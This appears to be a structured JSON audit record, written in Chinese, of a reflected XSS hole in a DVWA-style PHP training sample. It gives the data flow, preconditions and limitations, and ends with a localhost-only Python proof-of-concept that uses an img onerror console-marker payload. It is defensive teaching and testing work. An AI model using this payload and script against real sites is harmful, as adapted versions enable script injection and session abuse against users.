@@ -1,0 +1,121 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "XSS-001",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": ["XSS-001"],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "包内代码完整覆盖了从输入到危险输出的路径：第4行从$_GET读取name并只做存在与非NULL判断，第6行把原始值直接拼接进'<pre>Hello ' . $_GET['name'] . '</pre>'，中间没有任何编码、过滤或类型约束函数；第2行还显式输出X-XSS-Protection: 0。输入可控、拼接点明确、无防护代码三项静态证据齐全。外围处理器与dvwaHtmlEcho源码未提供，其对$html是否二次编码无法从片段内排除，因此结论保持待验证而非确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "XSS-001-F1",
+      "vulnerability_type": "反射型跨站脚本（Reflected XSS）",
+      "locations": [
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "$html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';"
+        },
+        {
+          "fragment_id": "XSS-001",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "if( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {"
+        }
+      ],
+      "data_flow": [
+        "入口：第4行array_key_exists(\"name\", $_GET)判定GET参数name存在，且$_GET['name'] != NULL，未做长度、字符集或白名单校验。",
+        "处理：第5至6行仅附加注释，随后在第6行把$_GET['name']原值用字符串连接（.）拼入$html，拼接位置是<pre>元素的HTML文本内容区，未调用htmlspecialchars、htmlentities、strip_tags或任何自定义过滤函数。",
+        "汇聚与持久化：片段内无数据库写入、无文件写入、无会话赋值，因此不属于存储型；$html是累积输出缓冲变量，由外围处理器追加。",
+        "输出（片段外，源码未提供）：据输入说明，外围处理器按配置包含本片段，将$html插入page['body']，再调用dvwaHtmlEcho输出为HTML响应；该段具体实现本次不可见，是否再做实体编码未验证。",
+        "观察点：请求目标页面?name=<img src=x onerror=console.log(/LLM_LAB_XSS/.source)>，检查响应体中<pre>Hello 之后是否原样出现未编码的标签；再由浏览器加载同URL观察Console是否输出LLM_LAB_XSS，以区分回显与执行。"
+      ],
+      "principle": "反射型XSS：GET参数name的值未经HTML输出编码即被拼接进服务端生成的HTML字符串，浏览器在解析响应时会把其中的标签及事件处理器当作DOM结构和脚本执行，从而在同源页面上下文中运行攻击者指定的JavaScript。",
+      "impact": "攻击者可构造携带脚本的链接，诱导已登录用户在本靶场源内访问，脚本在受害者浏览器中于该页面源下执行，可用于代替用户发起同源请求、篡改页面内容或进行钓鱼式诱导。教学验证只使用console.log标记，不读取Cookie、不外传数据；真实危害受同源范围、受害者交互与浏览器策略限制。",
+      "preconditions": [
+        "外围处理器确实按配置包含本片段，并把$html输出到text/html响应中（输入说明如此描述，但context/源码未提供，需补证）。",
+        "攻击者能够诱使受害者访问构造好的GET链接，属于需要用户交互的反射路径。",
+        "响应中该拼接位置未被外围层（dvwaHtmlEcho或页面渲染层）再做HTML实体编码。",
+        "认证状态按部署而定：若目标页面要求登录会话，攻击者需受害者处于已登录状态，本片段本身不含token校验。"
+      ],
+      "counterexamples": [
+        "若dvwaHtmlEcho或page['body']渲染层对$html统一执行HTML实体编码，则标签会被转义为可见文本，本路径不成立；该层源码本次未提供，无法排除，也不能据此直接确认。",
+        "若服务器或前置代理对GET参数实施全局输入过滤（如剥离尖括号、事件属性），且该过滤覆盖本页面，则候选被阻断；包内未见此类配置。",
+        "若响应Content-Type不是text/html（例如text/plain或application/json），浏览器不会把内容解析为HTML，标签不执行。",
+        "第2行header(\"X-XSS-Protection: 0\")关闭的是旧版浏览器XSS审计器，不构成防护反例，反而削弱了历史浏览器上的拦截。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# XSS-001 reflected-XSS verification draft. Harmless console marker only.\n# Scope: localhost / 127.0.0.1 / ::1 only. Redirects are never followed. Cookie contents are never printed.\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}\nPAYLOAD = \"<img src=x onerror=console.log(/LLM_LAB_XSS/.source)>\"\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef assert_local(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in ('http', 'https'):\n        raise SystemExit('refuse non-http(s) scheme: %r' % parts.scheme)\n    if (parts.hostname or '') not in ALLOWED_HOSTS:\n        raise SystemExit('refuse non-local host: %r' % parts.hostname)\n\n\ndef read_cookie(path):\n    if not path:\n        return None\n    with open(path, 'r', encoding='utf-8') as fh:\n        value = fh.read().strip()\n    if not value:\n        raise SystemExit('cookie file is empty')\n    return value\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='XSS-001 local verification draft')\n    parser.add_argument('--base-url', default='http://127.0.0.1')\n    parser.add_argument('--path', required=True,\n                        help='page path that includes the XSS-001 fragment, e.g. /your/target/page.php')\n    parser.add_argument('--param', default='name')\n    parser.add_argument('--cookie-file', default=None,\n                        help='local file holding the PHPSESSID cookie value; never printed')\n    parser.add_argument('--timeout', type=float, default=10.0)\n    args = parser.parse_args()\n\n    target = args.base_url.rstrip('/') + '/' + args.path.lstrip('/')\n    assert_local(target)\n    query = urllib.parse.urlencode({args.param: PAYLOAD})\n    url = target + ('&' if urllib.parse.urlsplit(target).query else '?') + query\n    assert_local(url)\n\n    headers = {'User-Agent': 'llm-lab-xss001-draft/1.0'}\n    cookie = read_cookie(args.cookie_file)\n    if cookie:\n        headers['Cookie'] = cookie\n\n    request = urllib.request.Request(url, headers=headers, method='GET')\n    opener = urllib.request.build_opener(NoRedirect)\n    try:\n        with opener.open(request, timeout=args.timeout) as response:\n            status = getattr(response, 'status', None) or response.getcode()\n            body = response.read().decode('utf-8', errors='replace')\n    except urllib.error.HTTPError as exc:\n        print('HTTP error %s %s' % (exc.code, exc.reason))\n        print('note: 301/302 here usually means the session is not authenticated for this path')\n        return 2\n    except urllib.error.URLError as exc:\n        print('connection or protocol error: %s' % exc.reason)\n        return 3\n\n    print('request URL: %s' % url)\n    print('HTTP status: %s' % status)\n    marker_at = body.find('LLM_LAB_XSS')\n    if marker_at < 0:\n        print('marker absent from body: check authentication, page path, security level and parameter name')\n        return 4\n    start = max(0, marker_at - 200)\n    end = min(len(body), marker_at + 200)\n    print('--- response context around marker ---')\n    print(body[start:end])\n    print('--- end context ---')\n    if '<img src=x onerror=' in body:\n        print('OBSERVED: payload reflected verbatim and the tag is not HTML-encoded')\n        print('browser execution still requires manual observation, see steps')\n        return 0\n    print('OBSERVED: marker present but the tag looks encoded; do not claim execution')\n    return 5\n\n\nif __name__ == '__main__':\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8 及以上，仅使用标准库（argparse、sys、urllib），无第三方依赖。",
+          "靶场需已在本地部署并可访问，且已存在一个有效的登录会话（若目标页面要求登录）。"
+        ],
+        "parameters": [
+          "--base-url http://127.0.0.1（靶场基址，脚本仅接受localhost、127.0.0.1、::1）",
+          "--path 必填，包含XSS-001片段的目标页面路径，需按实际部署填写，不能由本审计猜测",
+          "--param name（GET参数名，依据第4行array_key_exists(\"name\", $_GET)；默认name）",
+          "--cookie-file 本地保存PHPSESSID值的小文件路径（不放版本库、不打印内容）",
+          "--timeout 10（请求超时秒数，避免无限等待）"
+        ],
+        "steps": [
+          "1. 在本地靶场确认目标页面路径，并确认该页面加载时确实包含XSS-001片段（对照normalized_samples/XSS-001.php第4至6行）。",
+          "2. 用浏览器正常登录靶场，从开发者工具复制当前PHPSESSID值，写入一个仓外本地文件，例如 %TEMP%\\xss001_cookie.txt，内容形如 PHPSESSID=xxxx；不要在命令行或输出中暴露该值。",
+          "3. 运行 python xss_001_poc.py --path <目标页面路径> --cookie-file <本地cookie文件> --param name，观察HTTP状态与响应上下文片段。",
+          "4. 在浏览器地址栏打开脚本打印出的同一URL（含payload），打开开发者工具Console，确认是否出现 LLM_LAB_XSS 日志；必要时在Elements面板检查是否出现img节点。",
+          "5. 记录两阶段证据：服务端回显（响应中标签是否原样）与浏览器执行（Console日志）；同时用name=LLM_LAB_TEXT做对照请求，确认输入被正常回显。",
+          "6. 该测试不写入数据库、不产生持久内容，无需清理；若使用了专用于测试的会话，结束后自行注销。"
+        ],
+        "expected_observation": "HTTP响应中<pre>Hello 之后出现未编码的 <img src=x onerror=console.log(/LLM_LAB_XSS/.source)>，而不是 &lt;img 等实体形式；在浏览器打开同一URL时，Console输出 LLM_LAB_XSS，Elements中出现该img节点。HTTP回显本身只证明输入被输出，执行必须由浏览器观测确认。",
+        "success_criteria": "必要条件一：响应体中payload逐字出现且尖括号未被实体编码（回显证据）。必要条件二：浏览器加载同一URL后Console出现LLM_LAB_XSS日志或img节点存在于DOM（执行证据）。辅助对照：name=LLM_LAB_TEXT时页面正常显示该文本且无脚本行为。仅有必要条件一不得升级为确认；两类证据齐备且环境条件一致时，才可作为该条件下的确认依据。",
+        "limitations": [
+          "脚本未在本次审计中运行，execution_status为未运行，所有结论仍是静态候选判断。",
+          "目标页面路径、登录方式、安全难度配置与token状态未知，--path、--cookie-file 必须由验证人员按实际部署填写。",
+          "脚本默认拒绝非localhost目标，如需其他已授权地址须单独记录范围修改，不放宽为任意公网目标。",
+          "脚本只完成提交与回读，浏览器执行仍需人工在真实浏览器中观测，不能由HTTP 200或响应含标记代替。",
+          "payload使用console.log(/LLM_LAB_XSS/.source)以避免引号转义问题，属于无害标记，不读取Cookie、不发起外传请求。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/目录下的外围处理器源码：未提供，无法确认$html是否被额外编码、页面Content-Type以及包含本片段的具体条件分支。",
+    "dvwaPage.inc.php（dvwaHtmlEcho等渲染函数）实现：未提供，输出编码行为未知。",
+    "难度/安全等级配置与对应代码路径：本片段看似低难度实现，但其他等级的写入/过滤版本未提供，不能把本片段结论套用到全部配置。",
+    "运行环境：PHP版本、Web服务器、浏览器版本与操作系统均未实测；第2行X-XSS-Protection头对不同浏览器行为不同。",
+    "认证与会话：目标页面是否需要登录、是否存在CSRF token、会话状态如何建立均未提供。",
+    "是否存在前置WAF、代理或全局输入过滤：未提供。"
+  ],
+  "risk_notes": [
+    "第2行header (\"X-XSS-Protection: 0\"); 显式关闭旧版浏览器的XSS审计器，削弱了历史浏览器上的反射型XSS拦截，属于主动降低防护的配置，应作为风险面记录。",
+    "$html为共享输出缓冲变量，若外层或其他包含片段也向同一变量拼接可控内容，需另行审计，不能因本片段一处问题而认定全部输出点。",
+    "反射型XSS需受害者交互（点击构造链接），常被用于钓鱼或会话内操作诱导，属于本判定之外的社工风险面。",
+    "若同一name参数在其他页面被写入数据库再回显，可能演变为存储型路径，但本包无写入代码，需另证，不能由本片段推断。",
+    "关闭X-XSS-Protection与反射回显叠加时，历史浏览器（如旧版IE/Chrome）上的利用门槛进一步降低。"
+  ],
+  "quality_notes": [
+    "第4行使用松散比较$_GET['name'] != NULL，对\"0\"、空字符串等边界值的行为依赖PHP版本与比较语义，属于不严谨的输入判定，但不是XSS防护。",
+    "缺少对name参数的长度、字符集与允许字符约束，前端或服务端均未见校验。",
+    "输出位置未使用htmlspecialchars($value, ENT_QUOTES, 'UTF-8')等上下文匹配的编码函数，属于编码缺失型缺陷。",
+    "片段依赖外围变量$html，不能独立部署或独立运行，教学样例需结合context/源码理解。",
+    "header调用写法在括号前有空格，且在现代浏览器中已基本无效，属于过时/无效防护配置。"
+  ],
+  "limitations": [
+    "本次仅静态阅读XSS-001单个输入包（1/1），未运行任何请求或浏览器，verdict=待验证，不声称已确认漏洞。",
+    "结论限于片段内的输入到拼接路径；外围处理器、dvwaHtmlEcho与页面渲染层的输出编码无法从包内排除，相关缺口已列入missing_context。",
+    "POC为需人工适配草案，依赖真实页面路径、登录会话与本地部署条件，未执行，execution_status=未运行。",
+    "未评估其他难度配置或其他参数入口，不能把本片段结论推广到全仓库。",
+    "行号按normalized_samples/XSS-001.php的1起始局部行号给出，不代表全局文件行号。"
+  ],
+  "runtime_evidence": []
+}
